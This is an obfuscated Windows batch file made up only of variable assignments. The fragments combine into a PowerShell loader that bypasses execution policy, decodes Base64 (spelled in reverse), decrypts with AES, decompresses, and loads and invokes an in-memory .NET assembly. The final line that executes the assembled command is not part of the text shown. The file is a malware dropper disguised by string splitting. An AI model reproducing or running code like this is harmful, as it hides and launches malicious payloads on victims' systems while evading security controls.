@echo off
set "xaEzRGavrL=rt]:"
set "gWNckqRTGj=($dA"
set "CvezbnzASR==');"
set "hVfclqTJWP=bWAc"
set "ndSiElKXTE=ose("
set "WkTwjiTZII=vert"
set "BhenYSYVAA=YAp."
set "MKBuYWSveR=$Btg"
set "YHqkkEQHQD=DOd."
set "pwugPiSUpZ=oint"
set "OxCpAkxOQE=rity"
set "hwtAITAjHY=);$Q"
set "CPAiTJyRWM=ewLi"
set "wEpZSSsgcW=y.Pa"
set "VlDRxCpdhJ=iD);"
set "RCtoURyMzj= '')"
set "OaInzMgaDq=);$Q"
set "ngBQHMLSmZ=ke($"
set "HddnbJJXoD='[-1"
set "tzPITbNhMX=hiVn"
set "WewvOHTHcY=ss -"
set "JRpAkWijkN=.Cry"
set "qbeWAUCkSI=gth)"
set "WhnJvEKRBx=E) {"
set "VkFmmCostZ=]::("
set "KTNBJeZXSi== [S"
set "tkBQGzFzjz=bypa"
set "dEUEnjenvg=] -j"
set "EYVJayxToV=tem."
set "pzTcJKZZqT=e = "
set "RhuUeAqduz=ress"
set "nSQALGsvcj=OmSF"
set "rTejZLfhad=esMa"
set "IcCDwuzyRz='gni"
set "nBFhHNWanw=ptor"
set "dMQmjTltma=ion."
set "RwHAkfmgAK=zuZI"
set "DqOOhPqYIs=RmAx"
set "nBSkSgyHLw=)))"
set "aoQSyUTREO=-ep "
set "XsjZQtHnvV=Syst"
set "ZxfZKeUSHt=-4] "
set "ZXLFdCMVHm=y]::"
set "ymCBBDiOYp=bstr"
set "zyKJJEQlBV=D, 0"
set "oiqVjbmKgC=ct S"
set "ZTHDfQSMew=em.C"
set "UtaRCRWoFy=Syst"
set "xElFscsHYZ=tion"
set "PxvsaoqPss=saBm"
set "tEYXdaSjeO=onve"
set "chtnOlvNNZ=pose"
set "PKzESVWWMH=('%*'"
set "VGKrgtiDsC=bWAc"
set "ZJmIFUzoDe=Pbz."
set "dUZvoGyJaH=ach "
set "ZkvifdsJdE=.Key"
set "WfLmdekIqM=yTo("
set "fFcVyVhbjI=ay()"
set "tIfMWlDbDd='')("
set "FEniGuEyWI=);$C"
set "jrFEEVOiGZ=.Dis"
set "BssVkrlUvx=orF'"
set "irdqBSHVdp=jC ="
set "EKwkNozhGF=join"
set "GQLaYNUrhM=flec"
set "WIrwfifeKb=.Len"
set "AUoNmPIurr=Obje"
set "tLhMqtixrD=();$"
set "ZKInYsHKTX=fore"
set "tDEbeXUFEn=trea"
set "WorguFRZti=em.I"
set "JjutBiwfDo=daeR"
